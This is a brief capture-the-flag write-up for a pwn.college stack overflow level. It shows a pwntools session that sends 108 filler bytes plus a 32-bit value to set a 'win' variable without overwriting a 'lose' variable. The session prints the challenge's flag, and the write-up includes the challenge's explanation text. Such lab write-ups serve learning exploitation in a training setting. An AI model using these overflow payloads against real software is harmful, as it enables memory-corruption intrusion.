# Precision

this was a binary exploitation challenege where we need to previde the exact bytes to overflow the buffer if it was too much the buffer wull smash and we will not get the flag

## flag
pwn.college{AmaK3EYaYL25lFoSMLrssFGFysS.QX0AzNwEDL5gDN1czW}

## Solve

```bash
In [1]: from pwn import *

In [2]: p=process('binary-exploitation-lose-variable-w')
[!] Could not find executable 'binary-exploitation-lose-variable-w' in $PATH, using './binary-exploitation-lose-variable-w' instead
[x] Starting local process './binary-exploitation-lose-variable-w'
[+] Starting local process './binary-exploitation-lose-variable-w': pid 237

In [3]: payload=b'A'*108+p32(0x1)

In [4]: p.send(payload)

In [5]: p.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-lose-variable-w' stopped with exit code 0 (pid 237)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 7.11KB
[+] Receiving all data: Done (7.11KB)
00b0) | 90 6b e2 d0 fd 7f 00 00 | 0x00007ffdd0e26b90 |\n| 0x00007ffdd0e25b58 (rsp+0x00b8) | 97 29 40 00 00 00 00 00 | 0x0000000000402997 |\n+---------------------------------+-------------------------d return address is now pointing to 0x402997.\n- the canary is stored at 0x7ffdd0e25b48.\n- the canary value is now 0x197a8efca9c23100.\n- the address of the win variable is 0x7ffdd0e25b3c.\n- the value of the win variable is 0x1.\n- the address of the lose variable is 0x7ffdd0e25b40.\n- the value of the lose variable is 0x0.\n\nYou win! Here is your flag:\npwn.college{AmaK3EYaYL25lFoSMLrssFGFysS.QX0AzNwEDL5gDN1czW}\n\n\nGoodbye!\n'
```

```bash
ur stack pointer points to 0x7ffffb7353f0, and our base pointer points to 0x7ffffb7354a0.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffffb735420, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 108 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, when this variable is non-zero, the flag will be printed.
You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x7ffffb73548c, 108 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7ffffb735490, 112 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffffb735420 (the start of the input buffer)
right up to (but not including) 0x7ffffb736420 (which is 3988 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
```
in this binary file we say that the 108 bytes long the buffer is. so we can give 108 bytes and give the offset value of the first value and we can send the payload of exact 108 bytes after the offset value we get the flag



